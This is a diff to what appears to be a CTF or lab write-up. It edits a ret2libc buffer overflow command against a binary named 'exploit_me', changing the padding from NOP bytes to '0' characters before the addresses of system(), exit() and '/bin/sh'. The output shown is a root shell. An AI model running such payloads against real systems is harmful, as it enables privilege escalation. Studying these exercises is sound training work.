@@ -116,7 +116,7 @@ Now that we know that the offset must be **140 bytes** we can check it easily us
 Final step is to construct a sequence of bytes after this offset that will execute in order `system()`, `exit()` and finally `/bin/sh` and we have all these addresses to do so!
 
 ```shell
-  $> ./exploit_me `python -c 'print("\x90"*140 + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])'`
+  $> ./exploit_me `python -c 'print("0"*140 + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])'`
   00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000`X
   # id
   uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
